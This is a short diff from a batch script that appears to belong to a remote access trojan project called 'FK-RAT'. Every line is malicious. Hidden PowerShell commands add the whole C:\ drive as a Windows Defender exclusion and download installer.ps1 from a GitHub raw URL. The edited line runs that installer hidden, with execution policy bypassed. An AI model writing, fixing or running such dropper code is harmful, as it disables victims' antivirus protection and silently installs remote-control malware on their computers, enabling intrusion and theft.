@@ -34,4 +34,4 @@ REM diable defender
 REM rat resources
 powershell powershell.exe -windowstyle hidden -c "Add-MpPreference -ExclusionPath 'C:\' -Force -ea 0 | Out-Null";
 powershell powershell.exe -windowstyle hidden -c "Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/installer.ps1 -OutFile installer.ps1";
-powershell Start-Process  powershell.exe -windowstyle hidden -ep bypass -c "installer.ps1"
+powershell Start-Process  powershell.exe -windowstyle hidden -ep bypass -File "installer.ps1"
